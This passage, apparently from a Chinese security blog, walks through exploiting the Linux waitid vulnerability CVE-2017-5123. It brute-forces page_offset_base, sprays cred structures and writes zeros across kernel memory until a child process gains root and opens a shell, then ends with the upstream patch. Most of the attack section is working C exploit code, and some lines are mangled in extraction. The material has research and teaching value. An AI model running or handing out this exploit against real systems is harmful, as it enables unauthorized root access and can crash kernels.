那么若是需要完成提权，我们首先就需要找到当前进程的 cred 在内核空间中的地址
### _Pre.线性映射区 （direct mapping area）_
众所周知，64 位下 Linux 的虚拟内存空间布局如下：
其中有一块区域叫 `物理地址直接映射区`（direct mapping area），这块区域的线性地址到物理地址空间的映射是 **线性连续的**
在 32 位下这块区域叫`低端内存`，内核空间起始的 896 M 直接映射到物理内存的 0 ~ 896M
64 位下好像没有低端内存这个概念了，但是 DMA 这个区域的概念还是存在的，`kmalloc` 便从此处分配内存，这块区域的起始位置称之为
`page_offset_base`
> vmalloc 则从 vmalloc/ioremap space 分配内存，起始地址为 `vmalloc_base`，这一块区域到物理地址间的映射是
> **不连续的**
### 爆破 page_offset_base
让我们重新将目光放回 waitid 这个系统调用的代码，我们知道 `unsafe_put_user` 类似于 `copy_from_user`，
**在访问非法地址时并不会引起 kernel panic，而是会返回一个错误值** ，由此我们便能够用来 **爆破 page_offset_base
的地址** ——包括 cred 在内的通过 kmalloc 分配的 object 都在线性存储区域内，而这个区域的起始地址便是
`page_offset_base`
我们可以输入任意地址到 waitid 中，若未命中则 waitid 将返回 `-EFAULT`，否则说明我们成功命中了 **有效地址**
`page_offset_base` 在未开始 KASLR 时的基址为 `0xffff888000000000`，我们由此开始以
`0x10000000`作为尺度进行爆破
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char **argv)
    {
        size_t              page_offset_base = 0xffff888000000000;
        int                 retval;
        while(1)
        {
            int pid = fork();
            if (pid == 0)
            {
                exit(-1);
            }
            else if (pid > 0)
            {
                printf("trying: %p\n", page_offset_base);
                retval = waitid(P_PID, pid, page_offset_base, WEXITED);
                if (retval >= 0)
                    break;
                page_offset_base += 0x10000000;
            }
        }
        printf("\033[32m\033[1m[+] Successful found the \033[0mpage_offset_base\033[32m\033[1m at:\033[0m%p\n", page_offset_base);
    }
爆破需要的时间还是在可以承受的范围内的
### 预测 cred 所在位置
还是使用之前的驱动，我们现在将尽可能多地在内核空间喷射 cred 结构体，并观察其位置：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(void)
    {
        int fd = open("/dev/a3device", O_RDONLY);
        long long ptr[0x10];
        size_t              page_offset_base = 0xffff888000000000;
        int                 retval;
        while(1)
        {
            int pid = fork();
            if (pid == 0)
            {
                exit(-1);
            }
            else if (pid > 0)
            {
                printf("trying: %p\n", page_offset_base);
                retval = waitid(P_PID, pid, page_offset_base, WEXITED);
                if (retval >= 0)
                    break;
                page_offset_base += 0x10000000;
            }
        }
        printf("\033[32m\033[1m[+] Successful found the \033[0mpage_offset_base\033[32m\033[1m at:\033[0m%p\n", page_offset_base);
        while (1)
        {
            int pid = fork();
            if (pid == 0)
            {
                read(fd, ptr, 8);
                printf("[*] cred: %p\n", ptr[0]);
                sleep(100);
            }
        }
    }
观测结果如下：
我们可以发现分配出来的 cred 都在 `page_offset_base + 0x10000000` 往后的位置，这为我们利用该漏洞改写 cred
结构体的 uid 提供了可能性
经笔者多次实验，从 `page_offset_base + 0x50000000` 开始往后的位置是出现 cred 结构体 _可能性比较大的位置_
### 喷射大量 cred，内核空间遍历写 0
那么我们现在有一个绝妙的思路——我们可以先在内核空间喷射足够多的 cred 结构体，随后利用 CVE-2017-5123 从
`page_offset_base + 0x50000000` 开始往后以 `0x10` 为尺度写 0， **总能够在我们喷射的诸多 cred
中命中一个**  
我们使用 clone 创建多个轻量级子进程，不断循环检测自身的 euid 是否被修改为 0
最终的 exp 如下：
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int dev_fd;
    void child_process(void)
    {
        int         euid;
        cpu_set_t   mask;
        CPU_ZERO(&mask);
        CPU_SET(0,&mask);
        sched_setaffinity(0,sizeof(mask),&mask);
        /*
        size_t cred_addr;
        read(dev_fd, &cred_addr, 8);
        printf("[*] child cred: %p\n", cred_addr);
        */
        while (1)
        {
            euid = geteuid();
            if (!euid)
            {
                puts("[+] Successfully get the root!");
                setresuid(0, 0, 0);
                setresgid(0, 0, 0);
                system("/bin/sh");
                return ;
            }
            usleep(100000);
        }
    }
    int main(void)
    {
        size_t              page_offset_base = 0xffff888000000000;
        size_t              cur_attack_addr;
        int                 retval;
        cpu_set_t           mask;
        CPU_ZERO(&mask);
        CPU_SET(0,&mask);
        sched_setaffinity(0,sizeof(mask),&mask);
        dev_fd = open("/dev/a3device", O_RDONLY);
        // find page_offset_base
        while(1)
        {
            int pid = fork();
            if (pid == 0)
            {
                exit(-1);
            }
            else if (pid > 0)
            {
                //printf("trying: %p\n", page_offset_base);
                retval = waitid(P_PID, pid, page_offset_base, WEXITED);
                if (retval >= 0)
                    break;
                page_offset_base += 0x10000000;
            }
        }
        printf("\033[32m\033[1m[+] Successful found the \033[0mpage_offset_base\033[32m\033[1m at: \033[0m%p\n", page_offset_base);
        // cred spray
        puts("\033[34m\033[1m[*] start cloning child process...\033[0m");
        for (int i = 0; i  23)
            {
                i = 0;
                cur_attack_addr += 0x1000;
            }
            printf("\033[34m\033[1m[*] Attacking the: \033[0m%p\n", cur_attack_addr + i * 176);
            waitid(P_ALL, 0, cur_attack_addr + 4 + i * 176, WNOHANG );
            waitid(P_ALL, 0, cur_attack_addr + 20 + i * 176, WNOHANG );
        }
    }
不过这种方法 **纯靠猜测 cred 在内核地址空间中可能的位置并进行爆破**
，因此成功的机率并不是特别的高，且因为爆破过程中会覆写多个无关的内核数据结构，很容易造成 kernel panic，因此这个漏洞并不是特别容易进行利用
# 0x03.漏洞修复
这个漏洞修复的方式比较简单，只需要将缺失的 `access_ok()` 宏添加到 waitid 系统调用中即可，[Kees Cook 提交的
commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96ca579a1ecc943b75beba58bebb0356f6cc4b51)便是如此修复的：
    diff --git a/kernel/exit.c b/kernel/exit.c
    index f2cd53e92147c..cf28528842bcf 100644
    --- a/kernel/exit.c
    +++ b/kernel/exit.c
    @@ -1610,6 +1610,9 @@ SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
        if (!infop)
            return err;
    +   if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))
    +       goto Efault;
    +
        user_access_begin();
        unsafe_put_user(signo, &infop->si_signo, Efault);
        unsafe_put_user(0, &infop->si_errno, Efault);
    @@ -1735,6 +1738,9 @@ COMPAT_SYSCALL_DEFINE5(waitid,
        if (!infop)
            return err;
    +   if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))
    +       goto Efault;
    +
        user_access_begin();
        unsafe_put_user(signo, &infop->si_signo, Efault);
        unsafe_put_user(0, &infop->si_errno, Efault);